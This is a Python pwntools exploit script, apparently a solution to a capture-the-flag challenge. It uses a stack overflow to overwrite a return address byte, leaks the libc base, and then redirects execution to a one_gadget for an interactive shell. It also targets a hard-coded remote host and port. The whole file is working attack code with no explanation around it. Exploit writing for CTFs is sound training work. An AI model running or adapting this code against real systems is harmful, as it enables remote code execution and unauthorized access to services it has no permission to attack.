
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'


exe = ELF("chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.log_level = 'info'

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

rop = ROP(exe)

host, port = "34.141.229.188", "1337"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

# overwrite LSB of libc_main return address, to return to main & leak libc address at the same time
payload = 'A'*0x18+p8(0x76)
sa('movie?: \n', payload)

# get our libc leak
libc.address = u64(rcu('A'*0x18, b'\x3f').ljust(8,b'\x00')) - 0x29d76
logbase()
onegadgets = one_gadget(libc.path, libc.address)

# __free_hook is just used to have a writable address in rbp
payload = 'A'*0x10+p64(libc.sym['__free_hook'])+p64(onegadgets[0])
sa('movie?: \n', payload)

p.interactive()

